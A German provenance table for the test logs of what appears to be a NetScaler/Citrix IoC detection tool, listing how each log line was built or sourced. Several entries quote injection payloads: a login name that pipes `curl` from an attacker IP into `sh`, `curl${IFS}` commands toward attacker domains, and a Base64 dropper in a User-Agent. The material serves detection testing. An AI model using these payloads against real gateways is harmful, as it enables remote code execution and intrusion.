# Herkunft der Testlogs

Stand 2026-10-14. Jede Datei nennt je Zeile die Herkunft. Status "konstruiert" heißt: Zeile im Logformat von 14.1-73.41 nach Lab-Wissen gebaut, Payload nach veröffentlichtem Muster; sie testet die Regex, nicht die Realität, und ist durch eine Bericht- oder Lab-Zeile zu ersetzen. Status "Bericht" nennt die Fundstelle, "Lab" den Erzeugungslauf.

Anonymisierung: Quell-IPs 198.51.100.0/24 und 192.0.2.0/24 (RFC 5737), Hostname gw-01, vServer gw-vs, Benutzer user01 bis user04. Angreifer-IPs und Domains sind die echten Werte aus der Regeldatei, sonst wird nichts getestet.

| Datei | Zeile | Status | Herkunft |
|---|---|---|---|
| cve-2026-88771.log | 1 bis 5 | konstruiert | Trigger-Texte und Perl-Handler nach CTX697096-Analysen (Mandiant/GTIG 29.09., watchTowr 28.09.); Payload `curl${IFS}... v5v.in` nach Community-Bericht 08.10.; zu ersetzen durch Lab-Lauf: Injection-Login gegen das Lab-Gateway, dann `grep` über ns.log und nsvpn.log |
| cve-2026-88772.log | 1 bis 2 | konstruiert | DTLS-Handshake-Fehlerformat nach SSLLOG-Format 14.1; Muster `DTLS_FAIL_RE` aus Regeldatei 2026-10-06 |
| cve-2026-88779.log | 1 bis 4 | konstruiert | nsaaad-Absturzzeilen nach FreeBSD-Kernel- und Pitboss-Format; Muster aus Regeldatei 2026-10-06 |
| cve-2026-107406.log | 3 bis 4 | abgeleitet | keine veröffentlichten Indikatoren, Stand 2026-10-13 (CTX697191); nsaaad-Crash als Spur aus der Fehlerklasse |
| cve-2026-88771.log | 6 bis 7 | Bericht, konstruiert im Logformat | CISA SIGMA CMA_SIGMA_Citrix_CVE_2026_8871.yaml (29.09.): S2, S8, S9, S10, S11 als Payload-Fragmente; Zeile 7 Base64-Dropper im User-Agent nach Unit 42 Threat Brief (Update 30.09.) |
| cve-2026-88771.log | 8 | Bericht, Originalzeile | CERT-EU Blog 28.09., Abschnitt "Pulling the thread": `process_kernel_socket: call to authenticate user :pitboss PPE missed too many heartbeatsNSPPE;grep${IFS}INDEX:...`; Quelle gekürzt mit `[..]`, Zeitstempel und Header im 14.1-Format ergänzt. Erste belegte Logzeile im Testbestand |
| cve-2026-88771.log | 9 | Bericht, abgeleitet | SOCRadar 07.10.: Login-Name aus dem Request-Body des exploit.py (`pitboss NSPPE-00;curl ... 45.143.130.195:8899/s/<bid>|sh;# unexpectedly died`), in die AAA-LOGIN-Zeile übertragen |
| cve-2026-88771.log | 10 | Bericht, abgeleitet | LevelBlue SpiderLabs 02.10.: Login-Name mit Entschärfungs-Leerzeichen (`p itboss`, `N SPPE`, `t ar`), Leerzeichen entfernt |
| cve-2026-88771-httpaccess.log | 1 bis 6 | Bericht, konstruiert im Logformat | CISA SIGMA S3/S4 (doAuthentication.do), S6 (nsgclient18.deb, nsgclient18_32.deb); Zeile 4 Base64-Dropper im User-Agent mit 404 nach Unit 42; Zeile 5 nsgbuild.deb nach Unit 42 Threat Brief (Stand 08.10.); Zeile 6 nsginstaller64.deb nach GTIG/Mandiant 29.09. (URI-Muster); Zeile 7 User-Agent `INDEX:<base64>` auf `tmindex.html` nach CERT-EU Blog 28.09., Abschnitt "Uncanny user agent" (Quelle gekürzt, Base64 Platzhalter) |
| cve-2026-88771-ps.log | 1 | Bericht, konstruiert im ps-Format | CISA SIGMA S7: ns_monuploadd_err.pl -WR ausserhalb des Stock-Daemons (PPID 1). Lab 14.1-73.46 (2026-10-14): legitimer Parent ist `/netscaler/monuploadd` (Pitboss-Watch), nicht cron |
| clean.log | 1 bis 9 | Lab-Muster, anonymisiert | die Zeilenarten, die in V5 bis V8 Fehlalarme ausgelöst haben: CMD_EXECUTED, shell_command, sh_command, nsprofmon, normale Logons, Apostroph im Namen, User-Agent |

| clean.log | 10 bis 14 | Grenzfälle legitimer Namen, konstruiert | Backslash (`DOMAIN\user05`), Plus und At (UPN), Nicht-ASCII, Benutzernamen, die mit Kommandonamen beginnen (`sh.arma`, `grep.thomas`) |
| admin-audit.log | 1 bis 3 | Lab-Muster, anonymisiert | Admin-Kommandos im Shell-Audit und CLI-Audit, die Kommandonamen und Trigger-Texte enthalten; die Einzelprüfungen `CMD` und `TRIGGER_RE` treffen hier absichtlich, `INJECTION` nicht (Ausschluss über `ADMIN_CMD_RE`). Deshalb nur `INJECTION:0` als Erwartung |

## Adressen

| Bereich | Verwendung |
|---|---|
| 192.0.2.0/24 (TEST-NET-1) | interne Adressen: SNIP, Admin-Clients |
| 198.51.100.0/24 (TEST-NET-2) | Quell-IPs von Clients und Angreifern in den Testzeilen |
| 203.0.113.0/24 (TEST-NET-3) | frei für weitere Rollen |

Die Angreifer-Adressen und Domains in den Payloads (`143.198.7.94`, `v5v.in`, `pylrk.cc`, `gs.thc.org`) sind die echten Werte aus `ATTACKER_IP_RE` und `ATTACKER_DOM_RE` und werden mit der Regeldatei gepflegt: fällt ein Wert aus der Regel, muss die Testzeile mit, sonst meldet `--testlog` einen FAIL. Betreiber, die eigene Logzeilen als Testmaterial einreichen, ersetzen Quell-IPs, Hostnamen und Benutzernamen nach demselben Schema (`gw-01`, `gw-vs`, `user0n`).

Nicht auf eine Appliance kopieren: die Angriffsdateien treffen jeden IoC-Scanner.
| cve-2026-88771-httpaccess-real.log | 1 bis 6 | konstruiert im echten NetScaler-httpaccess-Format (`<client> -> <vserver> - - [Datum] [pid] "..." Status Bytes "-" "UA" "Time: n microsecs"`), nach Formatbeschreibung aus dem Collector-Chat 20.10.; Zeile 5 ohne `->` (Direktzugriff auf die NSIP); Inhalte wie cve-2026-88771-httpaccess.log, Adressen RFC 5737 |
| clean-lab-format.log | 1 bis 10 | Negativtest, nach Beschreibung echter Lab-Zeilen aus dem Collector-Chat 20.10. nachgebildet (ADM-Abfrage `show ns version` per NITRO, nsnetsvc, nscertfetcher `curl easy perform failed`, newsyslog, legitime Logon- und Linux-Client-Zeilen); Erwartung 0 Treffer in allen Prüfungen. Durch die echten anonymisierten Zeilen ersetzen, sobald sie aus dem Collector V5 vorliegen |
| httperror.log | 1 bis 7 | konstruiert nach Apache-2.4-Fehlerformat (Zeile 1 und 5 Interpreter, 2 bis 4 Sondierung von Webshell-Namen, 6 harmloses Theme-404, 7 Client außerhalb 127.0.0.x); Pfade aus veröffentlichten Webshell-Beschreibungen (Unit 42, LevelBlue, CISA), Adressen RFC 1918 |
| auth.log | 1 bis 6 | konstruiert nach OpenSSH- und FreeBSD-login-Meldungen; Adressen RFC 5737 und RFC 1918 |
| httpaccess-mgmt.log | 1 bis 3 | konstruiert im NetScaler-httpaccess-Format für die Management-Ebene (NITRO, GUI); Adressen RFC 5737 und RFC 1918 |
| aaa-fail.log | 1 bis 4 | konstruiert nach dem NetScaler-AAA-Syslog-Format (LOGIN_FAILED mit Client_ip und User, Message authenticate user failed), Zeile 4 Admin-Befehl als Negativfall; Adressen RFC 5737 und RFC 1918 |
| dom-boundary.log | 1 bis 4 | konstruiert: eine Domain der Regeldatei exakt, als Teil eines laengeren Namens, mit angehaengter Domain und in Grossbuchstaben; dazu eine Subdomain; Erwartung 3 (exakt, Grossbuchstaben, Subdomain) |
